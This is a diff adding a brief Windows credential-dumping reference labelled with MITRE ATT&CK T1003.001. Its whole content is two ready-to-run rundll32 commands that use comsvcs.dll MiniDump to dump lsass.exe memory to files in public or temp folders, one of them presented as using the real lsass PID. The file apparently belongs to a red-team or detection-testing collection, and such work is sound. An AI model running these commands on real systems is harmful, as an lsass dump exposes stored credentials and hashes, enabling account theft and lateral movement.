@@ -1,0 +1,7 @@
+# Credential Dumping via comsvcs.dll MiniDump (T1003.001)
+
+# Dump lsass.exe to dump file
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1234 C:\Users\Public\lsass.dmp full
+
+# Example using actual lsass PID:
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 720 C:\Windows\Temp\lsass.dmp full
